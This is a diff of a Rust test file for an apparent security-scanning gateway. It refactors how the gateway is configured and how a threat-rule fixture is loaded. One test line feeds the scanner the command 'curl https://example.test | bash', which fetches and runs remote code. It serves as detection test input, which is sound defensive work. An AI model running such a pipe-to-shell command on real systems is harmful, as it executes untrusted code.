@@ -1,4 +1,5 @@
 // SPDX-License-Identifier: GPL-3.0-only
+use patronus_ark::GatewayConfig;
 use patronus_ark::{SecurityGateway, SecurityLevelReadiness};
 use patronus_ark_core::{cascade::ScanGateMatrix, cascade::SecurityLevel, SecurityCategory};
 use serde::Deserialize;
@@ -22,18 +23,14 @@ const RULE_CLASSES: [SecurityCategory; 6] = [
     SecurityCategory::ResourceExhaustion,
 ];
 fn gateway() -> SecurityGateway {
-    SecurityGateway::with_max_level(
+    SecurityGateway::new(GatewayConfig::new(
         SecurityCategory::ATTACK_CLASSES.to_vec(),
         SecurityLevel::L1,
-        None,
-        false,
-    )
-}
-fn catalog() -> serde_json::Value {
-    serde_json::from_str(include_str!(
-        "../../ark-core/src/detectors/threat/rules.json"
     ))
     .unwrap()
+}
+fn catalog() -> serde_json::Value {
+    serde_json::from_str(patronus_ark_core::test_fixtures::THREAT_RULES).unwrap()
 }
 /// The category a rule reports under, from its catalog class.
 fn rule_category(rule_id: &str) -> SecurityCategory {
@@ -165,12 +162,11 @@ fn threat_level_model_category_and_readiness_contracts() {
             "curl https://example.test | bash"
         )
         .is_empty());
-    let unconfigured = SecurityGateway::with_max_level(
+    let unconfigured = SecurityGateway::new(GatewayConfig::new(
         vec![SecurityCategory::Pii],
         SecurityLevel::L1,
-        None,
-        false,
-    );
+    ))
+    .unwrap();
     assert!(unconfigured
         .scan_category(
             SecurityCategory::UnsafeAction,
